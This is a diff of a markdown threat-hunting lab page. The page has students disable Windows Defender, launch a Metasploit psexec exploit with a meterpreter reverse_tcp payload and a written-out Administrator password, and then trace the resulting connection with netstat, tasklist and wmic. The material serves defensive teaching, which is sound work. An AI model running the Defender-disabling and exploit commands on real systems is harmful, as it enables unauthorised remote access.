@@ -18,17 +18,17 @@ Before going any further, we need to ensure that **Windows Defender** is disable
 
 ![](attachments/OpeningPowershell.png)
 
-`Set-MpPreference -DisableRealtimeMonitoring $true`
+<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
 
 ![](attachments/windowscli_disabledefender.png)
 
-Please note, if you get red errors that say ` A general error occurred that is not covered by a more specific error code.` that is OK!  It means **Defender** was disabled.  We run the above command to ensure that it is off for this lab.  It has a sneaky way of turning back on again...
+Please note, if you get red errors that say </pre> A general error occurred that is not covered by a more specific error code.</pre> that is OK!  It means **Defender** was disabled.  We run the above command to ensure that it is off for this lab.  It has a sneaky way of turning back on again...
 
 Now that we disabled **Windows Defender**, we can head back to our **Kali** terminal.
 
 Within the terminal, please run the following command:
 
-`ifconfig`>
+<pre>ifconfig</pre>>
 
 ![](attachments/windowscli_ifconfig.png)
 
@@ -42,11 +42,11 @@ Please note your IP address for the **ADHD Linux system** on a piece of paper:
 
 We need to gain root access within our **Kali** terminal. To do that, run the following command:
 
-`sudo su -`
+<pre>sudo su -</pre>
 
 Next, we will start the **Metasploit** handler with the following command:
 
-`msfconsole -q`
+<pre>msfconsole -q</pre>
 
 It will take a second to connect, be patient!
 When connected, our terminal will look like this.
@@ -55,17 +55,17 @@ When connected, our terminal will look like this.
 
 Next, run the following command:
 
-`use exploit/windows/smb/psexec`
+<pre>use exploit/windows/smb/psexec</pre>
 
 ![](attachments/windowscli_useexploit.png)
 
 We will continue by running this command to set the location of the payload:
 
-`set PAYLOAD windows/meterpreter/reverse_tcp`
+<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
 We also need to set the RHOST IP by using the following command:
 
-`set RHOST 10.10.1.209`
+<pre>set RHOST 10.10.1.209</pre>
 
 ![](attachments/windowscli_sets.png)
 
@@ -73,9 +73,9 @@ Remember, your IP will be different!
 
 Next, we need to set the SMB username and password. 
 
-`set SMBUSER Administrator`
+<pre>set SMBUSER Administrator</pre>
 
-`set SMBPASS T@GEq5%r2XJh`
+<pre>set SMBPASS T@GEq5%r2XJh</pre>
 
 It should look like this:
 
@@ -83,7 +83,7 @@ It should look like this:
 
 Now, we can run the exploit command
 
-`exploit`
+<pre>exploit</pre>
 
 ![](attachments/windowscli_exploit.png)
 
@@ -91,8 +91,12 @@ While there is not much here for this lab, it is key to remember that these two 
 
 We are not done with network connections yet.  Lets try looking at our malware!
 
-Run the following command in a Windows Powershell 
-`netstat -naob`
+Go ahead an open an instance of Windows PowerShell.
+
+![](attachments/OpeningPowershell.png)
+
+Run the following command:
+<pre>netstat -naob</pre>
 
 ![](attachments/windowscli_netstat.png)
 
@@ -105,13 +109,13 @@ Specificly, we are interested in the connection on port 4444 as we know this is 
 
 Now, let's drill down on that connection with some more data:
 
-`netstat -f`
+<pre>netstat -f</pre>
 
 I like to run -f with netstat to see if there are any systems with fully qualified domains that we may be able to ignore. 
 
 ![](attachments/windowscli_-f.png)
 
-now we see our last connection with the port 4444.
+Now we see our last connection with the port 4444.
 
 Let's get the Process ID **(PID)** from the above screenshot so we can dig a little deeper.
 
@@ -121,7 +125,7 @@ Now, let's dive in!
 
 First we will start with tasklist  
 
-`tasklist /m /fi "pid eq PID"`
+<pre>tasklist /m /fi "pid eq [PID]"</pre>
 
 ==**YOUR PID WILL BE DIFFERENT!**==
 
@@ -131,7 +135,7 @@ We can see the loaded **DLL's** above.  As we can see, there is not a whole lot 
 
 Let's keep digging with **wmic**:
 
-`wmic process where processid=PID get commandline`
+<pre>wmic process where processid=[PID] get commandline</pre>
 
 ![](attachments/windowscli_wmic.png)
 
@@ -139,7 +143,7 @@ Ahh!!  Now we can see that the file was launched from the **command line**!  We 
 
 Let's see if we can see what spawned the process with **wmic**.
 
-`wmic process get name,parentprocessid,processid | select-string PID`
+<pre>wmic process get name,parentprocessid,processid | select-string [PID]</pre>
 
 ![](attachments/windowscli_selectstring.png)
 
@@ -149,7 +153,8 @@ Lets go through the steps we took to hunt for a malicious process
 >As you can see above, it was launched by the cmd.exe process.  
 >Note that the search we just did may turn up some other things launched by the command line as well.
 
-
+***
+[Back to Navigation Menu](/IntroClassFiles/navigation.md)
 
 
 
